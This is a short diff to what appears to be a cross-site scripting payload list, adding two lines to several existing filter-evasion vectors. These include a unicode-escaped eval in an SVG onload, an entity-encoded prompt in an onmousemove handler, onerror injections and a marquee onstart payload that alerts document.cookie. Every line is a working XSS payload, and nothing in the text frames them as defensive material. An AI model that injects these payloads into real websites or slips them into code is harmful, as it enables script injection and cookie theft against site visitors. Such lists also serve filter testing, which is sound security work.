@@ -2,3 +2,5 @@
 <svg on=x// //onload=\u0065\u0076\u0061\u006C("alert`/AmoloHT/`")>
 <body//%09%09////.//onmousemove='&#112;&#114;&#111;&#109;&#112;&#116;&lpar;&quot;&#65;&#109;&#111;&#108;&#111;&#72;&#84;&quot;&rpar;'//>
 x"//oNeRrOr=`/AmoloHT/`
+""onerror=javascript:alert('AmoloHT')
+"><u>XSS By AmoloHT</u><marquee+onstart='alert(document.cookie)'>XSS
